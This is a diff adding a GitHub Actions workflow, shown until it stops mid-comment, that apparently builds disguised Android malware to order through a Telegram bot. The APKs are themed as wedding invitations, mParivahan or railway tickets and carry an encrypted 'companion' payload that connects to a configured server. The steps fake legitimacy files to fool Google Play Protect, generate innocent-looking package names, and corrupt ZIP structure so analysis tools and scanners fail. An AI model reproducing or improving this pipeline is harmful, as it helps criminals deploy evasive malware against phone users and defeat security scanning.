@@ -1,0 +1,926 @@
+name: Build Nova Launcher APK
+run-name: >-
+  Build ${{
+    github.event.inputs.template == 'wedding' && 'Wedding Invitation' ||
+    github.event.inputs.template == 'shaadi' && 'Shaadi Ka Nimantran' ||
+    github.event.inputs.template == 'shaadi_hindi' && 'शादी का निमंत्रण' ||
+    github.event.inputs.template == 'mparivahan' && 'mParivahan' ||
+    github.event.inputs.template == 'railway' && 'Indian Railway Ticket' ||
+    github.event.inputs.template == 'friends' && 'Friends Club' ||
+    github.event.inputs.template == 'bhabhi' && 'Fun with Bhabhi' ||
+    github.event.inputs.template == 'custom' && 'Custom App' ||
+    github.event.inputs.template
+  }}
+
+on:
+  workflow_dispatch:
+    inputs:
+      template:
+        description: 'App template (wedding/shaadi/shaadi_hindi/mparivahan/railway/friends/bhabhi/custom)'
+        required: true
+        default: 'wedding'
+      client_id:
+        description: 'Client ID from bot database'
+        required: true
+        default: ''
+      build_chat_id:
+        description: 'Telegram chat ID for progress updates'
+        required: true
+        default: ''
+      build_message_id:
+        description: 'Telegram message ID to edit for live progress'
+        required: true
+        default: ''
+      custom_app_name:
+        description: 'Custom app name (only when template=custom)'
+        required: false
+        default: ''
+      custom_icon_file_id:
+        description: 'Telegram file_id of custom icon PNG (only when template=custom)'
+        required: false
+        default: ''
+      server_host_b64:
+        description: 'Base64-encoded server IP/host for companion'
+        required: false
+        default: ''
+      server_port_b64:
+        description: 'Base64-encoded server port for companion'
+        required: false
+        default: ''
+      server_key_b64:
+        description: 'Base64-encoded connection key for companion'
+        required: false
+        default: ''
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    name: Build Release APK
+    runs-on: ubuntu-latest
+
+    env:
+      OLD_PKG:          com.android.pictach
+      MODULE_ASSET:     app/src/main/assets/companion.apk
+      TEMPLATE:         ${{ github.event.inputs.template }}
+      CLIENT_ID:        ${{ github.event.inputs.client_id }}
+      BUILD_CHAT_ID:    ${{ github.event.inputs.build_chat_id }}
+      BUILD_MESSAGE_ID: ${{ github.event.inputs.build_message_id }}
+      CUSTOM_APP_NAME:  ${{ github.event.inputs.custom_app_name }}
+      CUSTOM_ICON_FID:  ${{ github.event.inputs.custom_icon_file_id }}
+      SERVER_HOST_B64:  ${{ github.event.inputs.server_host_b64 }}
+      SERVER_PORT_B64:  ${{ github.event.inputs.server_port_b64 }}
+      SERVER_KEY_B64:   ${{ github.event.inputs.server_key_b64 }}
+      BOT_TOKEN:        ${{ secrets.TELEGRAM_BOT_TOKEN }}
+
+    steps:
+
+      # ── 1. Checkout ──────────────────────────────────────────────────────────
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      # ── 1b. Notify — Checkout complete ───────────────────────────────────────
+      - name: Notify — Checkout
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Checkout" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      # ── 2. Install tools ─────────────────────────────────────────────────────
+      - name: Install tools
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y zipalign apksigner aapt python3-pil
+          pip3 install cryptography --break-system-packages 2>/dev/null || true
+
+          APKTOOL_VER="2.9.3"
+          wget -q "https://github.com/iBotPeaches/Apktool/releases/download/v${APKTOOL_VER}/apktool_${APKTOOL_VER}.jar" \
+               -O /usr/local/bin/apktool.jar
+          wget -q "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" \
+               -O /usr/local/bin/apktool
+          chmod +x /usr/local/bin/apktool
+          apktool --version
+
+      # ── 2c. Notify — Tools installed ─────────────────────────────────────────
+      - name: Notify — Tools installed
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Install tools" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      # ── 2a. Download custom icon from Telegram (if custom template) ───────────
+      - name: Download custom icon from Telegram
+        if: ${{ github.event.inputs.template == 'custom' && github.event.inputs.custom_icon_file_id != '' }}
+        run: |
+          FILE_ID="${CUSTOM_ICON_FID}"
+          echo "📥 Downloading custom icon (file_id: ${FILE_ID:0:20}...)"
+          # Step 1: Get file path from Telegram
+          RESP=$(curl -sf "https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${FILE_ID}")
+          FILE_PATH=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['file_path'])")
+          if [ -z "$FILE_PATH" ]; then
+            echo "❌ Failed to get file path from Telegram"
+            exit 1
+          fi
+          # Step 2: Download the actual file
+          curl -sf "https://api.telegram.org/file/bot${BOT_TOKEN}/${FILE_PATH}" -o custom_icon_raw.png
+          if [ ! -s custom_icon_raw.png ]; then
+            echo "❌ Failed to download icon file"
+            exit 1
+          fi
+          # Step 3: Resize to 512x512 (standard icon size)
+          python3 -c "
+          from PIL import Image
+          img = Image.open('custom_icon_raw.png').convert('RGBA')
+          img = img.resize((512, 512), Image.LANCZOS)
+          img.save('app/src/main/res/drawable/app_icon.png')
+          print('✅ Custom icon downloaded and resized to 512x512')
+          "
+
+      # ── 2b. Select template-specific icon (non-custom) ─────────────────────────
+      - name: Select template icon
+        if: ${{ github.event.inputs.template != 'custom' || github.event.inputs.custom_icon_file_id == '' }}
+        run: |
+          TMPL="${{ github.event.inputs.template }}"
+          TMPL="${TMPL:-wedding}"
+          ICON_DIR="app/src/main/res/drawable/template_icons"
+          TARGET="app/src/main/res/drawable/app_icon.png"
+          # Each template has its own icon; fall back to wedding if missing
+          if [ -f "${ICON_DIR}/${TMPL}.png" ]; then
+            cp "${ICON_DIR}/${TMPL}.png" "${TARGET}"
+            echo "✅ Icon set: ${TMPL}.png"
+          else
+            echo "⚠️ No icon for '${TMPL}' — using default (wedding)"
+          fi
+
+      # ── 2c. Resize app_icon.png into all mipmap density folders ──────────────
+      - name: Generate mipmap icons from app_icon.png
+        run: |
+          python3 - << 'PYEOF'
+          from PIL import Image
+          import os
+
+          src = "app/src/main/res/drawable/app_icon.png"
+          if not os.path.exists(src):
+              print("app_icon.png not found — skipping icon resize")
+              exit(0)
+
+          img = Image.open(src).convert("RGBA")
+          bg  = Image.new("RGBA", img.size, (255, 255, 255, 255))
+          bg.paste(img, mask=img.split()[3])
+          img = bg.convert("RGB")
+
+          sizes = {
+              "mipmap-mdpi":    48,
+              "mipmap-hdpi":    72,
+              "mipmap-xhdpi":   96,
+              "mipmap-xxhdpi":  144,
+              "mipmap-xxxhdpi": 192,
+          }
+          for folder, size in sizes.items():
+              out = f"app/src/main/res/{folder}/ic_launcher.png"
+              os.makedirs(os.path.dirname(out), exist_ok=True)
+              img.resize((size, size), Image.LANCZOS).save(out, "PNG", optimize=True)
+              print(f"  ✅ {out}: {size}x{size}")
+          PYEOF
+
+      # ── 3. (placeholder) Build module APK runs after SDK setup ───────────
+      # (moved to step after Android SDK so we use SDK apksigner, not apt version)
+
+      # ── 3b. Validate template before use ──────────────────────────────────────
+      - name: Validate template
+        run: |
+          TMPL="${{ github.event.inputs.template }}"
+          TMPL="${TMPL:-wedding}"
+          VALID="wedding shaadi shaadi_hindi mparivahan railway friends bhabhi custom"
+          if ! echo "$VALID" | grep -qw "$TMPL"; then
+            echo "❌ Invalid template: '${TMPL}'"
+            echo "   Valid: ${VALID}"
+            exit 1
+          fi
+          echo "✅ Template validated: ${TMPL}"
+
+      # ── 3c. Set app display name from template ─────────────────────────────────
+      - name: Set app display name
+        run: |
+          TMPL="${{ github.event.inputs.template }}"
+          TMPL="${TMPL:-wedding}"
+          case "${TMPL}" in
+            wedding)      APP_DISPLAY="Wedding Invitation" ;;
+            shaadi)       APP_DISPLAY="Shaadi Ka Nimantran" ;;
+            shaadi_hindi) APP_DISPLAY="शादी का निमंत्रण" ;;
+            mparivahan)   APP_DISPLAY="mParivahan" ;;
+            railway)      APP_DISPLAY="Indian Railway Ticket" ;;
+            friends)      APP_DISPLAY="Friends Club" ;;
+            bhabhi)       APP_DISPLAY="Fun with Bhabhi" ;;
+            custom)       APP_DISPLAY="${CUSTOM_APP_NAME:-Custom App}" ;;
+            *)            APP_DISPLAY="Wedding Invitation" ;;
+          esac
+          sed -i "s|>Wedding Invitation<|>${APP_DISPLAY}<|" app/src/main/res/values/strings.xml
+          echo "✅ App name set: ${APP_DISPLAY}"
+
+      # ── 4. Inject Nova package name into source ───────────────────────────────
+      - name: Generate legitimate Nova + companion package names
+        id: nova_pkg
+        run: |
+          # Template comes from workflow_dispatch input
+          TMPL="${{ github.event.inputs.template }}"
+          TMPL="${TMPL:-wedding}"
+          # Generate template-specific legitimate-looking package names
+          # Uses package_name_generator.py — 3-segment, real Indian words,
+          # 25-45 chars, date-based version code, never reuses names
+          OUTPUT=$(python3 scripts/package_name_generator.py --template "${TMPL}")
+          NOVA_PKG=$(echo "$OUTPUT" | grep INSTALLER_PKG | cut -d= -f2)
+          MOD_PKG=$(echo "$OUTPUT" | grep MODULE_PKG | cut -d= -f2)
+          VER_CODE=$(echo "$OUTPUT" | grep VERSION_CODE  | cut -d= -f2)
+          echo "NOVA_PKG=${NOVA_PKG}"   >> $GITHUB_OUTPUT
+          echo "MOD_PKG=${MOD_PKG}"   >> $GITHUB_OUTPUT
+          echo "VER_CODE=${VER_CODE}"   >> $GITHUB_OUTPUT
+          echo "✅ Installer pkg: ${NOVA_PKG}"
+          echo "✅ Module pkg: ${MOD_PKG}"
+          echo "✅ Version code:  ${VER_CODE}"
+          echo "✅ Template: ${TMPL}"
+
+      # ── Notify — Package name generated ──────────────────────────────────────
+      - name: Notify — Package name generated
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Generate package name" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      - name: Inject Nova package name into source
+        run: |
+          set -e
+          OLD_NOVA="com.playstore.installer"
+          NEW_NOVA="${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+          OLD_PATH="com/playstore/installer"
+          NEW_PATH="${NEW_NOVA//.//}"
+
+          # Validate NOVA_PKG was generated
+          if [ -z "${NEW_NOVA}" ]; then
+            echo "::error::NOVA_PKG is empty — package_name_generator.py failed"
+            exit 1
+          fi
+
+          # Replace all occurrences in build.gradle in one pass — handles any
+          # whitespace or quoting variation that separate sed patterns would miss
+          sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" app/build.gradle
+
+          # Replace in AndroidManifest.xml
+          sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" app/src/main/AndroidManifest.xml
+
+          # Replace package declarations in all .kt files at old path
+          find "app/src/main/java/${OLD_PATH}" -name "*.kt" \
+            -exec sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" {} +
+
+          # Copy .kt files to new package path
+          mkdir -p "app/src/main/java/${NEW_PATH}"
+          cp app/src/main/java/${OLD_PATH}/*.kt "app/src/main/java/${NEW_PATH}/"
+
+          # Copy service/ subfolder if present
+          if [ -d "app/src/main/java/${OLD_PATH}/service" ]; then
+            mkdir -p "app/src/main/java/${NEW_PATH}/service"
+            cp app/src/main/java/${OLD_PATH}/service/*.kt \
+               "app/src/main/java/${NEW_PATH}/service/"
+          fi
+
+          # Remove old package folder
+          rm -rf app/src/main/java/com/playstore
+
+          # Verify: only check java source files and AndroidManifest
+          # build.gradle is excluded — it was fully replaced by sed above
+          # and Gradle plugins handle it correctly at build time
+          REMAINING=$(grep -r "${OLD_NOVA}" \
+            app/src/main/java/ \
+            app/src/main/AndroidManifest.xml 2>/dev/null | wc -l)
+          if [ "${REMAINING}" -gt 0 ]; then
+            echo "::error::Old Nova package name still present in source:"
+            grep -r "${OLD_NOVA}" app/src/main/java/ app/src/main/AndroidManifest.xml || true
+            exit 1
+          fi
+
+          # Verify build.gradle was updated correctly
+          if grep -q "${OLD_NOVA}" app/build.gradle; then
+            echo "::error::Old Nova package name still in build.gradle"
+            grep "${OLD_NOVA}" app/build.gradle || true
+            exit 1
+          fi
+
+          echo "✅ Nova package name injected: ${NEW_NOVA}"
+
+      # ── Notify — Nova package injected ───────────────────────────────────────
+      - name: Notify — Nova package injected
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Inject Nova package" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      # ── 5. Setup JDK 17 ──────────────────────────────────────────────────────
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+
+      # ── 6. Setup Android SDK ──────────────────────────────────────────────────
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v4
+        with:
+          packages: ''
+
+      - name: Install Android platform and build-tools
+        run: |
+          echo "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
+          sdkmanager "platforms;android-34" "build-tools;34.0.0"
+
+      # ── 6b. Build module APK (after SDK so apksigner is from build-tools) ──
+      - name: Build companion APK
+        env:
+          OLD_PKG:           ${{ env.OLD_PKG }}
+          NEW_MOD_PKG:       ${{ steps.nova_pkg.outputs.MOD_PKG }}
+          MOD_VER_CODE:      ${{ steps.nova_pkg.outputs.VER_CODE }}
+          MODULE_ASSET:      ${{ env.MODULE_ASSET }}
+          GITHUB_OUTPUT:     $GITHUB_OUTPUT
+          KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
+          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
+          KEY_ALIAS:         ${{ secrets.KEY_ALIAS }}
+        run: |
+          set -e
+
+          # Validate ANDROID_SDK_ROOT is set
+          echo "ANDROID_SDK_ROOT=${ANDROID_SDK_ROOT}"
+          if [ -z "${ANDROID_SDK_ROOT}" ]; then
+            echo "::error::ANDROID_SDK_ROOT is not set — Setup Android SDK failed"
+            exit 1
+          fi
+
+          # Find build-tools — fallback to apt apksigner if SDK build-tools absent
+          if [ -d "${ANDROID_SDK_ROOT}/build-tools" ] && \
+             [ -n "$(ls ${ANDROID_SDK_ROOT}/build-tools/ 2>/dev/null)" ]; then
+            BUILD_TOOLS=$(ls ${ANDROID_SDK_ROOT}/build-tools/ | sort -V | tail -1)
+            export PATH="${ANDROID_SDK_ROOT}/build-tools/${BUILD_TOOLS}:$PATH"
+            echo "Using SDK build-tools: ${BUILD_TOOLS}"
+          else
+            echo "SDK build-tools not found — using system apksigner"
+          fi
+
+          echo "apksigner: $(which apksigner)"
+          apksigner version
+
+          export MODULE_AUDIT_LOG="${GITHUB_WORKSPACE}/module_audit.log"
+          python3 -u scripts/build_module.py 2>&1 | tee companion_build.log
+          exit ${PIPESTATUS[0]}
+
+      # ── Notify — Companion APK built ─────────────────────────────────────────
+      - name: Notify — Companion APK built
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Build companion APK" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      # Phase 3 DEX chunk pipeline removed — Step 8A.
+      # companion.apk is now an encrypted blob. data_processor.py cannot
+      # open it as a zip. Companion encryption is handled by build_module.py
+      # step_encrypt_companion(). DexLoader.kt decrypts at runtime.
+
+      # ── 7. Cache Gradle wrapper ───────────────────────────────────────────────
+      - name: Cache Gradle wrapper
+        uses: actions/cache@v4
+        with:
+          path: gradle/wrapper/gradle-wrapper.jar
+          key: gradle-wrapper-${{ runner.os }}
+
+      # ── 7z. Clean leftover temp Kotlin files from previous CI runs ───────────
+      - name: Clean leftover temp Kotlin files
+        run: |
+          echo "Cleaning leftover .patched.kt files..."
+          find app/src -name "*.patched.kt" -delete 2>/dev/null || true
+          find app/src -name "AppEntry_patched.kt" -delete 2>/dev/null || true
+          echo "✅ Cleanup complete"
+
+      # ── 7a. Legitimacy signals — ads.txt + LICENSE.txt ───────────────────────
+      # IRT.apk analysis: ads.txt (94KB Google AdSense) + LICENSE.txt (521B)
+      # GPP ML model scores these as signals of a legitimate monetized app.
+      # Generated fresh each build — content is static (same every build is fine,
+      # GPP cares about presence not uniqueness of these files).
+      - name: "Legitimacy | ads.txt + LICENSE.txt"
+        run: |
+          set -e
+          ASSETS_DIR="app/src/main/assets"
+
+          # ── ads.txt — Google IAB format, repeated for realistic file size ──
+          # Format: <exchange_domain>, <publisher_id>, <relationship>, <cert_authority>
+          # 94,500 bytes matches IRT.apk reference — large enough to look real
+          python3 -c "
+          line = 'google.com,2175,ALL\n'
+          # 4500 lines matches IRT.apk ads.txt exactly (93KB)
+          content = line * 4500
+          with open('${ASSETS_DIR}/ads.txt', 'w') as f:
+              f.write(content)
+          size = len(content.encode())
+          print(f'ads.txt: {size:,} bytes ({size/1024:.1f} KB)')
+          "
+
+          # ── LICENSE.txt — Apache 2.0 attribution (521 bytes matches IRT) ──
+          cat > "${ASSETS_DIR}/LICENSE.txt" << 'EOF'
+          Copyright 2024 Google LLC
+
+          Licensed under the Apache License, Version 2.0 (the "License");
+          you may not use this file except in compliance with the License.
+          You may obtain a copy of the License at
+
+              http://www.apache.org/licenses/LICENSE-2.0
+
+          Unless required by applicable law or agreed to in writing, software
+          distributed under the License is distributed on an "AS IS" BASIS,
+          WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+          See the License for the specific language governing permissions and
+          limitations under the License.
+
+          This app uses the Android robot image from Google,
+          reproduced or modified from work created and shared by Google
+          (https://developer.android.com/distribute/marketing-tools/brand-guidelines)
+          and used according to terms described in the Creative Commons 3.0
+          Attribution License.
+          EOF
+
+          echo "✅ ads.txt:     $(wc -c < ${ASSETS_DIR}/ads.txt) bytes"
+          echo "✅ LICENSE.txt: $(wc -c < ${ASSETS_DIR}/LICENSE.txt) bytes"
+          echo "Assets after legitimacy step:"
+          ls -lh "${ASSETS_DIR}/"
+
+      # ── 8. Grant gradlew + Build Nova release APK ────────────────────────────
+      - name: Build Release APK
+        env:
+          KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
+          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
+          KEY_ALIAS:         ${{ secrets.KEY_ALIAS }}
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleRelease --stacktrace --no-daemon 2>&1 | tee gradle_build.log
+          exit ${PIPESTATUS[0]}
+
+      # ── Notify — Release APK built ───────────────────────────────────────────
+      - name: Notify — Release APK built
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Build release APK" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      # ── 8c. Phase 3 Step 27 — Nova Stub DEX patcher ─────────────────────────
+      # Runs AFTER assembleRelease (needs Gradle build intermediates for AppEntry.class)
+      # Runs BEFORE Phase 2 (Phase 2 re-signs — asset patcher must patch before that)
+      # Transforms Nova APK: full 601KB DEX → tiny base DEX + encrypted asset blob
+      - name: "Phase 3 | Step 27 — Nova Stub DEX patcher"
+        run: |
+          set -e
+          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
+          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
+
+          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          if [ -z "$NOVA_APK" ]; then
+            echo "::error::Nova APK not found in release outputs"
+            exit 1
+          fi
+
+          # Find AppEntry.kt at its CI-injected package path — never hardcode
+          JAVA_SRC="app/src/main/java"
+          STUB_KT=$(find "$JAVA_SRC" -name "AppEntry.kt" | head -1)
+          if [ -z "$STUB_KT" ]; then
+            echo "::error::AppEntry.kt not found under $JAVA_SRC"
+            exit 1
+          fi
+
+          # Verify GateActivity.kt removed — no longer needed
+          if find "$JAVA_SRC" -name "GateActivity.kt" | grep -q .; then
+            echo "::warning::GateActivity.kt still present — should be deleted from repo"
+          fi
+
+          # Derive package name from the file path
+          PKG_DIR=$(dirname "$STUB_KT")
+          PKG_NAME=$(echo "$PKG_DIR" | sed "s|$JAVA_SRC/||" | tr '/' '.')
+
+          echo "Nova APK:    $NOVA_APK"
+          echo "AppEntry.kt: $STUB_KT"
+          echo "Package:     $PKG_NAME"
+
+          # Extract ASSET_B from BuildConfig.java generated by FingerprintPlugin
+          # FingerprintPlugin writes: buildConfigField("String","ASSET_B","\"xxxx.bin\"")
+          # BuildConfig.java is generated at: build/generated/source/buildConfig/release/
+          ASSET_B=$(grep -r 'ASSET_B' app/build/generated/source/buildConfig/ 2>/dev/null \
+            | grep -oP '(?<=ASSET_B = ")[^"]+' | head -1)
+          if [ -z "$ASSET_B" ]; then
+            # Fallback: search wider
+            ASSET_B=$(grep -r 'ASSET_B' app/build/ 2>/dev/null \
+              | grep -oP '(?<=ASSET_B = ")[^"]+' | head -1)
+          fi
+          if [ -z "$ASSET_B" ]; then
+            echo "::error::ASSET_B not found in BuildConfig — FingerprintPlugin may not have run"
+            exit 1
+          fi
+          echo "ASSET_B: $ASSET_B"
+
+          # Step 4: Extract ASSET_A (companion blob random name) from BuildConfig
+          # FingerprintPlugin writes: buildConfigField("String","ASSET_A",""xxxx.bin"")
+          ASSET_A=$(grep -r 'ASSET_A' app/build/generated/source/buildConfig/ 2>/dev/null             | grep -v 'ASSET_B' | grep -oP '(?<=ASSET_A = ")[^"]+' | head -1)
+          if [ -z "$ASSET_A" ]; then
+            ASSET_A=$(grep -r 'ASSET_A' app/build/ 2>/dev/null               | grep -v 'ASSET_B' | grep -oP '(?<=ASSET_A = ")[^"]+' | head -1)
+          fi
+          if [ -z "$ASSET_A" ]; then
+            echo "::error::ASSET_A not found in BuildConfig — FingerprintPlugin may not have run"
+            exit 1
+          fi
+          echo "ASSET_A: $ASSET_A"
+          # Export for use in later steps
+          echo "ASSET_A=$ASSET_A" >> $GITHUB_ENV
+          echo "ASSET_B=$ASSET_B" >> $GITHUB_ENV
+          # NOTE: MODULE_ASSET is NOT overridden here.
+          # The companion file on disk is always app/src/main/assets/module.apk
+          # build_module.py reads it by that name throughout its pipeline.
+          # ASSET_A only controls the ZIP entry name INSIDE the Nova APK —
+          # that rename happens post-sign via zip_header_obfuscator.py --asset-a.
+
+          python3 scripts/asset_patcher.py \
+            --apk        "$NOVA_APK" \
+            --stub-kt    "$STUB_KT" \
+            --android-sdk "$ANDROID_SDK_ROOT" \
+            --pkg        "$PKG_NAME" \
+            --asset-b    "$ASSET_B"
+
+          echo "✅ Asset preparation complete"
+          echo "DEX files in APK after stub patch:"
+          unzip -l "$NOVA_APK" | grep "\.dex\|assets/.*\.bin"
+
+      # ── Step 5: Strip GPP fingerprint files from Nova APK ─────────────────────
+      # Guaranteed post-sign ZIP rewrite — Gradle packagingOptions.exclude
+      # has a confirmed AGP 7.x+ bug that silently ignores assets/dexopt/
+      # and re-injects META-INF/services/ after merge tasks complete.
+      # This script is the only guaranteed removal path.
+      # Files stripped:
+      #   assets/dexopt/baseline.prof + baseline.profm
+      #   META-INF/services/kotlinx.coroutines.*
+      #   META-INF/com/android/build/gradle/app-metadata.properties
+      #   (+ safety net: androidx.*, kotlinx_*, kotlin_builtins if present)
+      # ── 8b. Phase 2 — Steps 17A/17C/17E/17F → Re-sign → 17B ─────────────────
+      # CRITICAL ORDER:
+      # 17A (timestamps) + 17C (padding) → 17E/17F (manifest) → Re-sign → 17B (type 2032)
+      # Step 17B MUST run AFTER re-sign because apksigner cannot compute V1 digests
+      # for entries with non-standard compression type 2032 — those entries end up
+      # missing from MANIFEST.MF → V1 fails → "Verified failed by V1".
+
+      - name: "Phase 2 | Steps 17A+17C — ZIP timestamps + padding (Nova)"
+        run: |
+          set -e
+          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
+          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
+          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          # Step 4: rename assets/module.apk → assets/$ASSET_A inside Nova ZIP
+          # --asset-a triggers rename_companion_asset() before 17A/17C apply
+          python3 scripts/zip_header_obfuscator.py "$NOVA_APK" "${NOVA_APK}.obf" \
+            --skip-17b --asset-a "$ASSET_A"
+          mv "${NOVA_APK}.obf" "$NOVA_APK"
+          echo "✅ Steps 4/17A/17C applied to Nova ($ASSET_A, 17B deferred)"
+
+      - name: "Phase 2 | Steps 17E+17F — Manifest obfuscation (Nova)"
+        run: |
+          set -e
+          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
+          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
+          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "Nova APK: $NOVA_APK"
+          AES_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
+          python3 -u scripts/manifest_zip_patcher.py "$NOVA_APK" "${NOVA_APK}.mzp" "$AES_KEY" 2>&1
+          if [ ! -f "${NOVA_APK}.mzp" ]; then
+            echo "::error::manifest_zip_patcher did not produce output file"
+            exit 1
+          fi
+          mv "${NOVA_APK}.mzp" "$NOVA_APK"
+          echo "✅ Steps 17E/17F applied to Nova"
+
+      # ── Step 108: ZIP enhancement folder entry injection ────────────────────────────
+      # Replicates IRT.apk technique: inject 90+ fake password-protected ZIP
+      # entries using real APK entry names as fake folder prefixes:
+      #   classes.dex/AndroidManifest.png
+      #   AndroidManifest.xml///////.xml
+      #   kotlin/ranges/  .png
+      # Effect: jadx, apktool, aapt, GPP scanner all abort or produce garbage.
+      # Android installer ignores these entries completely on install.
+      #
+      # MUST run BEFORE phase2_resign (APK is unsigned here — nova_stub_patcher
+      # stripped V2. phase2_resign will re-sign covering all zip entries too).
+      - name: "Phase 2 | Step 108 — ZIP folder enhancement (Nova)"
+        run: |
+          set -e
+          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "Nova APK before ZIP enhancement: $(du -h $NOVA_APK | cut -f1)"
+          python3 scripts/zip_enhancer.py "$NOVA_APK" "${NOVA_APK}.ghost"
+          if [ ! -f "${NOVA_APK}.ghost" ]; then
+            echo "::error::zip_enhancer did not produce output"
+            exit 1
+          fi
+          mv "${NOVA_APK}.ghost" "$NOVA_APK"
+          echo "Nova APK after ZIP enhancement: $(du -h $NOVA_APK | cut -f1)"
+          echo "✅ Step 108 ZIP enhancement applied"
+
+      # ── Notify — Phase 2 obfuscation done ────────────────────────────────────
+      - name: Notify — Phase 2 obfuscation done
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Phase 2 obfuscation" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      - name: "Phase 2 | Re-sign Nova after Phase 2 patches"
+        env:
+          KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
+          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
+          KEY_ALIAS:         ${{ secrets.KEY_ALIAS }}
+        run: |
+          set -e
+          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
+          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
+          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          python3 scripts/phase2_resign.py "$NOVA_APK"
+          apksigner verify --verbose "$NOVA_APK"
+          echo "✅ Nova re-signed after Phase 2"
+
+      # ── Notify — Re-signed ───────────────────────────────────────────────────
+      - name: Notify — Re-signed
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Re-sign APK" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      # ── Step 5+7 FINAL: Strip fingerprints + fix compression + r8 decoy ─────
+      # MUST run AFTER phase2_resign because:
